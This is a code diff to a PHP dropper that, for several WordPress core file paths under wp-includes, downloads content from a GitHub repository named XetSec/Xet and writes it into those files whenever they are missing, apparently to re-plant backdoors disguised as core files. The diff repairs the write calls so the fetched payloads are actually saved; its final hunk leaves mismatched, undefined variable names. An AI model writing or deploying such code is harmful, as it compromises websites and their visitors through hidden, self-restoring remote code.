@@ -348,9 +348,9 @@ if (file_exists($kupa50)) {
  }
 else { 
 echo('cekti');
-$hook50 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/default-constants.txt');
+$hook501 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/default-constants.txt');
 $hook50 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/default-constants.php" ; 
-if (file_put_contents ($hook50, $hook50));
+if (file_put_contents ($hook50, $hook501));
 
 } 
 /**/
@@ -362,9 +362,9 @@ if (file_exists($kupa51)) {
  }
 else { 
 echo('cekti');
-$hook51 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/ms-settings.txt');
+$hook512 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/ms-settings.txt');
 $hook51 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/ms-settings.php" ; 
-if (file_put_contents ($hook51, $hook51));
+if (file_put_contents ($hook51, $hook512));
 
 } 
 /**/
@@ -374,9 +374,9 @@ if (file_exists($kupa52)) {
  }
 else { 
 echo('cekti');
-$hook52 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/atomlib.txt');
+$hook523 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/atomlib.txt');
 $hook52 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/atomlib.php" ; 
-if (file_put_contents ($hook52, $hook52));
+if (file_put_contents ($hook52, $hook523));
 
 } 
 /**/
@@ -386,9 +386,9 @@ if (file_exists($kupa53)) {
  }
 else { 
 echo('cekti');
-$hook53 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-walker-comment.txt');
+$hook534 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-walker-comment.txt');
 $hook53 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-walker-comment.php" ; 
-if (file_put_contents ($hook53, $hook53));
+if (file_put_contents ($hook53, $hook534));
 
 } 
 /**/
@@ -398,21 +398,21 @@ if (file_exists($kupa54)) {
  }
 else { 
 echo('cekti');
-$hook54 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-smtp.txt');
+$hook545 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-smtp.txt');
 $hook54 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-smtp.php" ; 
-if (file_put_contents ($hook54, $hook54));
+if (file_put_contents ($hook54, $hook545));
 
 } 
 /**/
 /**/
-$kupa55 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/feed-rss2-comments.php";
+$kupa556 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/feed-rss2-comments.php";
 if (file_exists($kupa55)) { 
  }
 else { 
 echo('cekti');
 $hook55 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/feed-rss2-comments.txt');
 $hook55 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/feed-rss2-comments.php" ; 
-if (file_put_contents ($hook55, $hook55));
+if (file_put_contents ($hook55, $hook556));
 
 } }
 /**/
